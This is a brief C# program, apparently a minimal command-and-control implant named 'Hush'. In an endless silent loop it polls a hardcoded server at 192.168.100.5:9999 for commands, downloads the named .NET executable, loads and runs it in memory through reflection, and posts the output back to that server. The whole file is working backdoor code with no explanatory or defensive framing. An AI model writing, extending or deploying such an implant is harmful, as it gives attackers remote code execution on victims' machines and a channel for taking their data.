using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Hush
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    string command = new System.Net.WebClient().DownloadString("http://192.168.100.5:9999/command");

                    if (command != "")
                    {
                        // Fetch the payload
                        byte[] managedAssemblyBytes = new System.Net.WebClient().DownloadData("http://192.168.100.5:9999/" + command + ".exe");

                        // Load it in a ManagedAssembly
                        Assembly managedAssembly = Assembly.Load(managedAssemblyBytes);

                        // Fetch the Entry Point
                        //MethodInfo entryPoint = managedAssembly.EntryPoint;

                        // Fetch the Execute method
                        Type exec = managedAssembly.GetType("Program");
                        MethodInfo entryPoint = exec.GetMethod("Execute", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static);

                        // Invoke it
                        string retVal = (string)entryPoint.Invoke(null, new object[] { });

                        // Send back the response
                        new System.Net.WebClient().UploadString("http://192.168.100.5:9999/", retVal);
                    }
                }
                catch (WebException ex) {}
            }
        }
    }
}
